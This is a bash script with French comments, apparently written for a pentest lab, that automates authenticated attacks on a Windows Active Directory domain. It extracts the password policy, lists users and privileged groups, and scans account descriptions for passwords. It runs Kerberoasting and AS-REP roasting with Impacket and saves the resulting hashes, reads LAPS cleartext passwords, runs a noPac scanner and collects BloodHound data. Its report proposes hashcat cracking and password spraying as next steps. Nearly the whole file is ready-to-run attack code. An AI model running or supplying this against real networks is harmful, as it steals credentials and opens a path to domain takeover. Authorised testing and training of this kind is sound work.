#!/bin/bash
# ad-enum.sh — Enumération AD complète → fichier markdown
# Usage: ./ad-enum.sh <domain> <user> <pass> <DC-IP>
# Exemple: ./ad-enum.sh INLANEFREIGHT.LOCAL john 'Welcome1' 10.129.20.3
#
# Ce que ça fait (en parallèle) :
#   1. Password policy (AVANT TOUT)
#   2. Dump users complet → users.txt
#   3. Dump groupes et membres privilégiés
#   4. Dump computers
#   5. Kerberoasting (SPNs)
#   6. AS-REP Roasting (no preauth)
#   7. LAPS check
#   8. BloodHound collection
#   9. Output markdown complet pour 06_AD_Enum.md

set -e

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'; B='\033[1m'; NC='\033[0m'

if [[ $# -lt 4 ]]; then
    echo -e "${R}Usage: $0 <domain> <user> <pass> <DC-IP>${NC}"
    echo ""
    echo "  Ex: $0 INLANEFREIGHT.LOCAL john 'Welcome1' 10.129.20.3"
    exit 1
fi

DOMAIN="$1"
USER="$2"
PASS="$3"
DC_IP="$4"

OUTDIR="./ad-enum-$(date +%Y%m%d-%H%M)"
REPORT="$OUTDIR/AD-ENUM.md"
mkdir -p "$OUTDIR"

# Base DN
BASE_DN="DC=$(echo "$DOMAIN" | tr '[:upper:]' '[:lower:]' | sed 's/\./,DC=/g')"

echo -e "${B}${C}"
echo "╔═════════════════════════════════════════════════╗"
echo "║   ad-enum.sh — $DOMAIN"
echo "╠═════════════════════════════════════════════════╣"
echo "║   DC      : $DC_IP"
echo "║   User    : $USER"
echo "║   Output  : $OUTDIR/"
echo "╚═════════════════════════════════════════════════╝"
echo -e "${NC}"

# Header rapport
{
    echo "# 🏛️ AD Enumération — \`$DOMAIN\`"
    echo ""
    echo "**Date :** $(date +"%Y-%m-%d %H:%M")"
    echo "**DC :** \`$DC_IP\`"
    echo "**Creds :** \`$USER\` / \`$PASS\`"
    echo ""
    echo "---"
    echo ""
} > "$REPORT"

section() {
    echo ""
    echo -e "${C}━━━ $1 ━━━${NC}"
    echo "## $1" >> "$REPORT"
    echo "" >> "$REPORT"
}

run_cmd() {
    local label="$1"; shift
    echo -e "  ${Y}→${NC} $label..."
    echo "### $label" >> "$REPORT"
    echo '```' >> "$REPORT"
    timeout 30 "$@" 2>/dev/null >> "$REPORT" || echo "(erreur ou timeout)" >> "$REPORT"
    echo '```' >> "$REPORT"
    echo "" >> "$REPORT"
}

# ───────────────────────────────────────
# 1. PASSWORD POLICY — PREMIER
# ───────────────────────────────────────
section "1. Password Policy (LIRE AVANT DE SPRAYER)"

echo -e "  ${R}[!!!] LIRE LE LOCKOUT THRESHOLD AVANT TOUT SPRAY${NC}"
echo "" >> "$REPORT"
echo "> [!DANGER] Vérifier le lockout threshold avant tout password spray !" >> "$REPORT"
echo "" >> "$REPORT"

if command -v nxc &>/dev/null; then
    run_cmd "nxc Password Policy" nxc smb "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --pass-pol
fi

if command -v enum4linux-ng &>/dev/null; then
    run_cmd "enum4linux-ng Password Policy" enum4linux-ng "$DC_IP" -u "$USER" -p "$PASS" -P
fi

echo -e "${G}[✓] Password policy${NC}"

# ───────────────────────────────────────
# 2. USERS
# ───────────────────────────────────────
section "2. Users du domaine"

# Dump via nxc
if command -v nxc &>/dev/null; then
    run_cmd "nxc users" nxc smb "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --users
fi

# LDAP dump complet
if command -v ldapsearch &>/dev/null; then
    echo -e "  ${Y}→${NC} LDAP user dump..."
    ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" \
        -b "$BASE_DN" "(objectClass=user)" sAMAccountName description \
        2>/dev/null | grep -E "^sAMAccountName:|^description:" | \
        sed 's/sAMAccountName: //' | \
        grep -v "^$" > "$OUTDIR/users_with_desc.txt" 2>/dev/null || true

    # Extraire usernames propres
    ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" \
        -b "$BASE_DN" "(objectClass=user)" sAMAccountName \
        2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}' | \
        sort -u > "$OUTDIR/users.txt" 2>/dev/null || true

    USER_COUNT=$(wc -l < "$OUTDIR/users.txt" 2>/dev/null || echo 0)
    echo -e "  ${G}[✓] $USER_COUNT users extraits dans $OUTDIR/users.txt${NC}"

    echo "### LDAP User Dump" >> "$REPORT"
    echo "\`\`\`" >> "$REPORT"
    echo "$USER_COUNT users extraits dans users.txt" >> "$REPORT"
    head -30 "$OUTDIR/users.txt" 2>/dev/null >> "$REPORT"
    [[ $USER_COUNT -gt 30 ]] && echo "... ($((USER_COUNT - 30)) de plus)" >> "$REPORT"
    echo "\`\`\`" >> "$REPORT"
    echo "" >> "$REPORT"

    # Comptes avec descriptions (souvent contiennent des passwords)
    if [[ -s "$OUTDIR/users_with_desc.txt" ]]; then
        echo "### ⚠️ Comptes avec description (potentiels passwords !)" >> "$REPORT"
        echo '```' >> "$REPORT"
        cat "$OUTDIR/users_with_desc.txt" >> "$REPORT"
        echo '```' >> "$REPORT"
        echo "" >> "$REPORT"
        echo -e "  ${R}[!!!] Comptes avec description — vérifier les passwords dans les descriptions${NC}"
    fi
fi

echo -e "${G}[✓] Users${NC}"

# ───────────────────────────────────────
# 3. GROUPES PRIVILÉGIÉS
# ───────────────────────────────────────
section "3. Groupes privilégiés"

PRIV_GROUPS=("Domain Admins" "Enterprise Admins" "Administrators" "Schema Admins"
             "Group Policy Creator Owners" "DnsAdmins" "Backup Operators"
             "Server Operators" "Account Operators" "Remote Management Users"
             "Print Operators" "Hyper-V Administrators")

for grp in "${PRIV_GROUPS[@]}"; do
    members=""
    if command -v nxc &>/dev/null; then
        members=$(nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" \
            --groups "$grp" 2>/dev/null | grep "Member" || true)
    fi

    if [[ -z "$members" ]] && command -v ldapsearch &>/dev/null; then
        members=$(ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" \
            -b "$BASE_DN" "(&(objectClass=group)(cn=$grp))" member \
            2>/dev/null | grep "^member:" | awk '{print $2}' | grep -oP "CN=[^,]+" | sed 's/CN=//' || true)
    fi

    if [[ -n "$members" ]]; then
        echo -e "  ${Y}→${NC} ${B}$grp${NC} : $(echo "$members" | head -5 | tr '\n' ', ')"
        echo "### \`$grp\`" >> "$REPORT"
        echo '```' >> "$REPORT"
        echo "$members" >> "$REPORT"
        echo '```' >> "$REPORT"
        echo "" >> "$REPORT"
    fi
done

echo -e "${G}[✓] Groupes${NC}"

# ───────────────────────────────────────
# 4. COMPUTERS
# ───────────────────────────────────────
section "4. Machines du domaine"

if command -v nxc &>/dev/null; then
    run_cmd "nxc computers" nxc smb "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --computers
fi

echo -e "${G}[✓] Computers${NC}"

# ───────────────────────────────────────
# 5. KERBEROASTING
# ───────────────────────────────────────
section "5. Kerberoasting (SPNs)"

if command -v impacket-GetUserSPNs &>/dev/null || python3 -c "import impacket" &>/dev/null; then
    echo -e "  ${Y}→${NC} GetUserSPNs..."
    impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" \
        -outputfile "$OUTDIR/kerberoast_hashes.txt" 2>/dev/null || true

    if [[ -s "$OUTDIR/kerberoast_hashes.txt" ]]; then
        COUNT=$(wc -l < "$OUTDIR/kerberoast_hashes.txt")
        echo -e "  ${R}[!!!] $COUNT hash(es) Kerberoast → $OUTDIR/kerberoast_hashes.txt${NC}"
        echo "### ⚠️ Hashes Kerberoast ($(wc -l < "$OUTDIR/kerberoast_hashes.txt") hashes)" >> "$REPORT"
        echo '```' >> "$REPORT"
        cat "$OUTDIR/kerberoast_hashes.txt" >> "$REPORT"
        echo '```' >> "$REPORT"
        echo "" >> "$REPORT"
        echo "\`\`\`bash" >> "$REPORT"
        echo "# Cracking :" >> "$REPORT"
        echo "hashcat -m 13100 $OUTDIR/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt" >> "$REPORT"
        echo "# Ou : ./creds/hash-crack.sh $OUTDIR/kerberoast_hashes.txt" >> "$REPORT"
        echo "\`\`\`" >> "$REPORT"
        echo "" >> "$REPORT"
        echo -e "  ${C}Lancer : ./creds/hash-crack.sh $OUTDIR/kerberoast_hashes.txt${NC}"
    else
        echo -e "  ${Y}Aucun compte Kerberoastable${NC}"
        echo "Aucun compte avec SPN trouvé." >> "$REPORT"
        echo "" >> "$REPORT"
    fi
fi

echo -e "${G}[✓] Kerberoast${NC}"

# ───────────────────────────────────────
# 6. AS-REP ROASTING
# ───────────────────────────────────────
section "6. AS-REP Roasting (no preauth)"

if command -v impacket-GetNPUsers &>/dev/null && [[ -f "$OUTDIR/users.txt" ]]; then
    echo -e "  ${Y}→${NC} GetNPUsers..."
    impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" \
        -usersfile "$OUTDIR/users.txt" -format hashcat \
        -outputfile "$OUTDIR/asrep_hashes.txt" 2>/dev/null | \
        grep -v "^$\|krb5asrep" | head -20 || true

    if [[ -s "$OUTDIR/asrep_hashes.txt" ]]; then
        COUNT=$(wc -l < "$OUTDIR/asrep_hashes.txt")
        echo -e "  ${R}[!!!] $COUNT hash(es) AS-REP → $OUTDIR/asrep_hashes.txt${NC}"
        echo "### ⚠️ Hashes AS-REP Roast ($COUNT hashes)" >> "$REPORT"
        echo '```' >> "$REPORT"
        cat "$OUTDIR/asrep_hashes.txt" >> "$REPORT"
        echo '```' >> "$REPORT"
        echo "" >> "$REPORT"
        echo "\`\`\`bash" >> "$REPORT"
        echo "hashcat -m 18200 $OUTDIR/asrep_hashes.txt /usr/share/wordlists/rockyou.txt" >> "$REPORT"
        echo "# Ou : ./creds/hash-crack.sh $OUTDIR/asrep_hashes.txt" >> "$REPORT"
        echo "\`\`\`" >> "$REPORT"
        echo "" >> "$REPORT"
    else
        echo -e "  ${Y}Aucun compte AS-REP Roastable${NC}"
        echo "Aucun compte sans pre-authentication." >> "$REPORT"
        echo "" >> "$REPORT"
    fi
fi

echo -e "${G}[✓] AS-REP${NC}"

# ───────────────────────────────────────
# 7. CHECKS DIVERS
# ───────────────────────────────────────
section "7. Checks divers"

# LAPS
echo -e "  ${Y}→${NC} LAPS..."
if command -v nxc &>/dev/null; then
    LAPS=$(nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --laps 2>/dev/null || true)
    if echo "$LAPS" | grep -q "ms-Mcs-AdmPwd"; then
        echo -e "  ${R}[!!!] LAPS passwords lisibles !${NC}"
        echo "### ⚠️ LAPS (passwords en clair !)" >> "$REPORT"
        echo '```' >> "$REPORT"
        echo "$LAPS" >> "$REPORT"
        echo '```' >> "$REPORT"
        echo "" >> "$REPORT"
    fi
fi

# Trusted for delegation
echo -e "  ${Y}→${NC} Unconstrained delegation..."
if command -v nxc &>/dev/null; then
    run_cmd "Delegation" nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --trusted-for-delegation
fi

# Bleeding edge CVE check
echo -e "  ${Y}→${NC} NoPac check..."
if command -v python3 &>/dev/null; then
    if [[ -f "$HOME/Tools/noPac/scanner.py" ]]; then
        python3 "$HOME/Tools/noPac/scanner.py" "$DOMAIN/$USER:$PASS" \
            -dc-ip "$DC_IP" -use-ldap 2>/dev/null >> "$REPORT" || true
    fi
fi

echo -e "${G}[✓] Checks divers${NC}"

# ───────────────────────────────────────
# 8. BLOODHOUND
# ───────────────────────────────────────
section "8. BloodHound Collection"

echo -e "  ${Y}→${NC} bloodhound-python..."
if command -v bloodhound-python &>/dev/null; then
    bloodhound-python -d "$DOMAIN" -u "$USER" -p "$PASS" \
        -ns "$DC_IP" -c All --zip \
        --directory "$OUTDIR" 2>/dev/null && \
        echo -e "  ${G}[✓] BloodHound data collectée${NC}" || \
        echo -e "  ${Y}[~] BloodHound collection échouée (normal si Kerberos clock skew)${NC}"

    echo "BloodHound data dans : \`$OUTDIR/*.zip\`" >> "$REPORT"
    echo "" >> "$REPORT"
    echo "**Queries prioritaires :**" >> "$REPORT"
    echo "- Shortest Path to Domain Admins" >> "$REPORT"
    echo "- Find Kerberoastable Users" >> "$REPORT"
    echo "- Find AS-REP Roastable Users" >> "$REPORT"
    echo "- Shortest Paths from Owned Principals" >> "$REPORT"
    echo "" >> "$REPORT"
else
    echo -e "  ${Y}[~] bloodhound-python non disponible${NC}"
    echo '```bash' >> "$REPORT"
    echo "# Collecter manuellement :" >> "$REPORT"
    echo "bloodhound-python -d $DOMAIN -u '$USER' -p '$PASS' -ns $DC_IP -c All --zip" >> "$REPORT"
    echo '```' >> "$REPORT"
    echo "" >> "$REPORT"
fi

# ───────────────────────────────────────
# RÉSUMÉ FINAL
# ───────────────────────────────────────
{
    echo "---"
    echo ""
    echo "## 📊 Résumé"
    echo ""
    echo "| Fichier | Contenu |"
    echo "|---|---|"
    echo "| \`users.txt\` | Liste complète des users |"
    [[ -f "$OUTDIR/kerberoast_hashes.txt" ]] && echo "| \`kerberoast_hashes.txt\` | Hashes TGS à cracker |"
    [[ -f "$OUTDIR/asrep_hashes.txt" ]] && echo "| \`asrep_hashes.txt\` | Hashes AS-REP à cracker |"
    echo ""
    echo "### Prochaines étapes"
    echo ""
    echo "\`\`\`bash"
    echo "# Password spray avec les users"
    echo "./creds/spray.sh $OUTDIR/users.txt $DC_IP $DOMAIN"
    echo ""
    echo "# Cracker les hashes Kerberoast"
    [[ -f "$OUTDIR/kerberoast_hashes.txt" ]] && echo "./creds/hash-crack.sh $OUTDIR/kerberoast_hashes.txt"
    [[ -f "$OUTDIR/asrep_hashes.txt" ]] && echo "./creds/hash-crack.sh $OUTDIR/asrep_hashes.txt"
    echo "\`\`\`"
    echo ""
    echo "> **Coller dans** : \`06_AD_Enum.md\`"
} >> "$REPORT"

echo ""
echo -e "${B}${G}╔═════════════════════════════════════════════════╗${NC}"
echo -e "${B}${G}║            AD ENUM TERMINÉE                     ║${NC}"
echo -e "${B}${G}╚═════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  Output   : ${B}$OUTDIR/${NC}"
echo -e "  Rapport  : ${B}$REPORT${NC}"
echo -e "  Users    : ${B}$OUTDIR/users.txt${NC}"
ls "$OUTDIR/"*.txt 2>/dev/null | while read -r f; do
    COUNT=$(wc -l < "$f" 2>/dev/null || echo 0)
    [[ $COUNT -gt 0 ]] && echo -e "  ${G}[✓]${NC} $(basename "$f") — $COUNT lignes"
done
echo ""
